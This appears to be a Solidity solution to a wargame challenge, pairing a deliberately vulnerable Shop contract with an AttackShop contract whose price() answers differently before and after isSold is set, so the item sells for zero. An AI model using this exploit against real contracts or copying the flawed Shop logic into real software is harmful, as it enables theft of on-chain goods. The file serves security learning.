// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}


contract AttackShop {

  Shop king;

  constructor(address payable _king) {
    king = Shop(_king);
  }
 
  function attack() external  returns (uint) {
      king.buy();
  }
  function price() external view returns (uint) {
      if (king.isSold() ) {
          return 0;
      }
      return 100;
  }
  
}